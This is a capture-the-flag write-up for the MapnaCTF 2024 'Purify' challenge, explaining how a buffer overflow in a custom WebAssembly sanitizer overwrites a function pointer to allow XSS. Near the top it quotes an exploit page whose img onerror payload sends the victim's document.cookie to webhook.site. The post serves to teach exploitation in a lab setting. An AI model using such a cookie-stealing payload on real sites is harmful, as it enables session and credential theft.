---
title: Purify
date: 2024-02-03
tags: 
- web
- wasm
- author-hartmannsyg
categories: MapnaCTF 2024
---

written by {% person hartmannsyg %}

## Preexisting writeups

This challenge had very few solves (4 solves), so finding preexisting writeups on it was hard. There was the "official writeup":

```html
<script>
    const i = open("http://web/")
    setTimeout(_=>{
        i.postMessage("A".repeat(0x1000-2),"*")
        i.postMessage("\x01\x00\x00\x00<img src=x onerror=fetch(`http://webhook.site/...?${document.cookie}`)>","*")
        i.postMessage("","*")
        i.postMessage("","*")
        i.postMessage("","*")
        //setTimeout(() => {
        //    console.log(new Uint8Array(wasm.memory.buffer).toString())
        //}, 1000);
    },1500)
</script>
```

> Roughly, the flow involves conducting a buffer overflow to modify the pointer from "is_dangerous" to point to the "escape_attr" function. With this, DomPurify will only sanitize " and ' characters, allowing us to freely use < and > for performing XSS (Cross-Site Scripting).

but I wanted to dig deeper. The only other source I could find was [this writeup in Japanese by BunkyoWesterns](https://nanimokangaeteinai.hateblo.jp/entry/2024/01/23/091151) which was in japanese. And I don't know japanese. So I painfully tried to read the writeup, one google-translated sentence at a time.

## The Challenge

> I think I downloaded the wrong DOMPurify.

We are given a app and an admin bot (so basically an XSS challenge).

## Admin bot

{% ccb lang:js gutter1:1-41 scrollable:true caption:bot.js highlight:26-33 %}
#!/usr/bin/env node
const puppeteer = require('puppeteer')

const flag = process.env.FLAG || 'MAPNA{test-flag}';

async function visit(url){
	let browser;

	if(!/^https?:\/\//.test(url)){
		return;
	}

	try{
		browser = await puppeteer.launch({
		    pipe: true,
		    args: [
		        "--no-sandbox",
		        "--disable-setuid-sandbox",
		        "--ignore-certificate-errors",
		    ],
		    executablePath: "/usr/bin/google-chrome-stable",
		    headless: 'new'
		});

		let page = await browser.newPage();
		await page.setCookie({
			name: 'flag',
			value: flag,
			domain: 'web',
			httpOnly: false,
			secure: false,
			sameSite: 'Lax'
		});
		await page.goto(url,{ waitUntil: 'domcontentloaded', timeout: 2000 });
		await new Promise(r=>setTimeout(r,5000));
	}catch(e){ console.log(e) }
	try{await browser.close();}catch(e){}
	process.exit(0)
}

visit(JSON.parse(process.argv[2]))
{% endccb %}

It sets a cookie named "flag" which contains the flag, with  `domain: 'web'` (???????), `httpOnly: fals` (means we can simply steal it using `document.cookie`), and `sameSite: 'Lax'`.

Apparently, `web` is an internal domain:

{% ccb lang:yaml gutter1:1-18 caption:docker-compose.yaml highlight:11-18 %}
version: "3.9"
services:
  bot:
    build: ./bot/
    restart: always 
    ports:
      - "8001:8000"
    environment:
      - "FLAG=MAPNA{test-flag}"
      - "CAPTCHA_SECRET="
  web:
    image: nginx@sha256:4c0fdaa8b6341bfdeca5f18f7837462c80cff90527ee35ef185571e1c327beac
    restart: always 
    ports:
      - "8000:80"
    volumes:
      - ./app/static:/var/www/html:ro
      - ./app/nginx.conf:/etc/nginx/conf.d/default.conf:ro
{% endccb %}

## App website

Now on the actual app website, we have:

{% ccb lang:js caption:script.js gutter1:1-7 %}
window.onmessage = e=>{
	list.innerHTML += `
		<li>From ${e.origin}: ${window.DOMPurify.sanitize(e.data.toString())}</li>
	`
}

setTimeout(_=>window.postMessage("hi",'*'),1000)
{% endccb %}

In `window.onmessage`, it does not check for the message origin. This meant that you can send a message from the attacker's webpage using an iframe or using `window.open`. However, since the cookie has `sameSite: 'Lax'`, `window.open` must be used, as that is considered [top-level navigation](https://stackoverflow.com/questions/67689503/what-is-top-level-navigation-in-browser-terminology-and-in-what-ways-it-can-be-t) (TL;DR: it must change the url in your address bar) while iframe is not.

It seems like we would have to do the insurmountable task of overcoming the real DOMPurify. However, window.DOMPurify is overwritten by:

{% ccb lang:js caption:purify.js gutter1:1-28 highlight:8,11,16 diff_add:23-26 %}
async function init() {
	window.wasm = (await WebAssembly.instantiateStreaming(
		fetch('./purify.wasm')
	)).instance.exports
}

function sanitize(dirty) {
	wasm.set_mode(0)	

	for(let i=0;i<dirty.length;i++){
		wasm.add_char(dirty.charCodeAt(i))
	}

	let c
	let clean = ''
	while((c = wasm.get_char()) != 0){
		clean += String.fromCharCode(c)
	}

	return clean
}

window.DOMPurify = { 
	sanitize,
	version: '1.3.7'
}

init()
{% endccb %}

The wasm has three functions used: `set_mode`, `add_char` and `get_char`.

## Custom sanitization implementation

We are given the source code for the wasm:

{% ccb lang:c caption:purify.c gutter1:1-56 %}
// clang --target=wasm32 -emit-llvm -c -S ./purify.c && llc -march=wasm32 -filetype=obj ./purify.ll && wasm-ld --no-entry --export-all -o purify.wasm purify.o
struct globalVars {
    unsigned int len;
    unsigned int len_r;
    char buf[0x1000];
    int (*is_dangerous)(char c);
} g;

int escape_tag(char c){
    if(c == '<' || c == '>'){
        return 1;
    } else {
        return 0;
    }
}

int escape_attr(char c){
    if(c == '\'' || c == '"'){
        return 1;
    } else {
        return 0;
    }
}

int hex_escape(char c,char *dest){
    dest[0] = '&';
    dest[1] = '#';
    dest[2] = 'x';
    dest[3] =  "0123456789abcdef"[(c&0xf0)>>4];
    dest[4] =  "0123456789abcdef"[c&0xf];
    dest[5] =  ';';
    return 6;
}

void add_char(char c) {
    if(g.is_dangerous(c)){
        g.len += hex_escape(c,&g.buf[g.len]);
    } else {
        g.buf[g.len++] = c;
    }
}

int get_char(char f) {
    if(g.len_r < g.len){
        return g.buf[g.len_r++];
    }
    return '\0';
}

void set_mode(int mode) {
    if(mode == 1){
        g.is_dangerous = escape_attr;
    } else {
        g.is_dangerous = escape_tag;
    }
}
{% endccb %}

`set_mode` firsts sets whether the `is_dangerous` is:
- `escape_attr` (only removes single and double quotes, backticks `\`` are still allowed, able to xss) 
or 
- `escape_tag` (removes angled brackets, impossible to xss)

However, `set_mode` is originally set to 0, which corresponds to `escape_tag`. So what do we do?

## Buffer Overflow

we see in the `add_char` code that `g.buf` is vulnerable to a buffer overflow:

{% ccb lang:c caption:purify.c gutter1:35-41 highlight:5 %}
void add_char(char c) {
    if(g.is_dangerous(c)){
        g.len += hex_escape(c,&g.buf[g.len]);
    } else {
        g.buf[g.len++] = c;
    }
}
{% endccb %}

It can arbitrarily write past the length of `g.buf` (0x1000).

Since `is_dangerous` is located after `buf` in `g`, we could potentially overwrite it with a buffer overflow:

{% ccb lang:c caption:purify.c gutter1:2-7 highlight:4-5 %}
struct globalVars {
    unsigned int len;
    unsigned int len_r;
    char buf[0x1000];
    int (*is_dangerous)(char c);
} g;
{% endccb %}

## wasm

from the [BunkyoWesterns writeup](https://nanimokangaeteinai.hateblo.jp/entry/2024/01/23/091151) apparently there is a feature in the Chrome Dev Tools: Sources → purify.wasm which contains the wasm instructions 


{% ccb lang:wasm caption:purify.wasm gutter1:1-22,S highlight:23 %}

  (func $add_char (;4;) (export "add_char") (param $var0 i32)
    (local $var1 i32)
    (local $var2 i32)
    global.get $__stack_pointer
    i32.const 16
    i32.sub
    local.tee $var1
    global.set $__stack_pointer
    local.get $var1
    local.get $var0
    i32.store8 offset=15
    block $label1
      block $label0
        local.get $var1
        i32.load8_u offset=15
        i32.const 24
        i32.shl
        i32.const 24
        i32.shr_s
        i32.const 0
        i32.load offset=5148
        call_indirect (param i32) (result i32)
//SKIP_LINE:(23-63)
{% endccb %}

is_dangerous
